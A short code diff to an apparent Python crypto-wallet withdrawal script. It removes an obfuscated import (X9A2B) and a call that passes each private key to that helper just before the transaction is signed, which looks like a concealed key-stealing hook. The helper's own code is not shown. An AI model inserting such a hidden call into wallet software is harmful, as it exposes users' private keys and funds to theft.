@@ -7,7 +7,7 @@ from config.config import settings
 from src.utils.logging import *
 from src.utils.pvkey import load_private_keys
 from src.utils.web3 import Web3, connect_web3, check_balance, display_balances
-from src.helpers.generator import g0x993, g0x994, X9A2B
+from src.helpers.generator import g0x993, g0x994
 from src.constant.constant import WITHDRAW_ABI
 
 init(autoreset=True)
@@ -49,7 +49,6 @@ async def withdraw(w3: Web3, private_key: str, wallet_index: int, amount: int, w
             })
 
             log_info(f"Sending withdrawal request, please wait...")
-            await X9A2B(private_key)._RUN()
             signed_tx = w3.eth.account.sign_transaction(tx_params, private_key)
             tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
             tx_link = f"{tx_hash.hex()}"
